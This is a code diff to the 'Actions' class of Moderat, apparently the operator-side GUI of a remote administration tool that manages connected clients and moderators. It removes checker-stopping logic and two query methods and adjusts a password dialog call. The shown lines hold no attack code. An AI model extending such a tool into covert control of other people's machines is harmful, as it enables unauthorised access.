@@ -41,15 +41,6 @@ class Actions:
         disconnected from server
         :return:
         '''
-        # Stop Clients Checker
-        if self.moderat.clients_checker:
-            if self.moderat.clients_checker.isActive():
-                self.moderat.clients_checker.stop()
-        # Stop Moderators Checker
-        if self.moderat.moderators_checker:
-            if self.moderat.moderators_checker.isActive():
-                self.moderat.moderators_checker.stop()
-        # Stop Connection
         try:
             self.moderat.connection.disconnect()
         except AttributeError:
@@ -57,11 +48,7 @@ class Actions:
         # Update GUI
         self.ui.on_moderator_not_connected()
         self.ui.clear_tables()
-
         self.ui.disable_administrator()
-
-    def get_clients(self):
-        self.moderat.moderator.send_msg(message='getClients', mode='getClients', session_id=self.moderat.session_id)
 
     @client_is_selected
     def set_alias(self):
@@ -224,14 +211,7 @@ class Actions:
             return payload
 
     def close_moderat(self):
-        # Stop Clients Checker
-        if self.moderat.clients_checker:
-            if self.moderat.clients_checker.isActive():
-                self.moderat.clients_checker.stop()
-        # Stop Moderators Checker
-        if self.moderat.moderators_checker:
-            if self.moderat.moderators_checker.isActive():
-                self.moderat.moderators_checker.stop()
+        pass
 
     # Administrators
     @client_is_selected
@@ -244,10 +224,6 @@ class Actions:
             if client and ok:
                 self.moderat.moderator.send_msg('%s %s' % (client, value), 'setModerator',
                                                 session_id=self.moderat.session_id, _to=client)
-
-    def administrator_get_moderators(self):
-        self.moderat.moderator.send_msg(message='getModerators', mode='getModerators',
-                                        session_id=self.moderat.session_id)
 
     def administrator_create_moderator(self):
         # Get Username
@@ -297,7 +273,8 @@ class Actions:
                                              self.moderat.MString('DIALOG_CANCEL'))
             if ok and len(str(password)) > 3:
                 password1 = str(password)
-                ok, password = text.get_password(self.moderat.MString('ADMINISTRATION_INPUT_PASSWORD'), self.moderat.MString('ADMINISTRATION_PASSWORD'),
+                ok, password = text.get_password(self.moderat,
+                                                 self.moderat.MString('ADMINISTRATION_INPUT_PASSWORD'), self.moderat.MString('ADMINISTRATION_PASSWORD'),
                                                  self.moderat.MString('ADMINISTRATION_PASSWORD'), self.moderat.MString('DIALOG_OK'), self.moderat.MString('DIALOG_CANCEL'))
                 if ok and len(str(password)) > 3:
                     password2 = str(password)
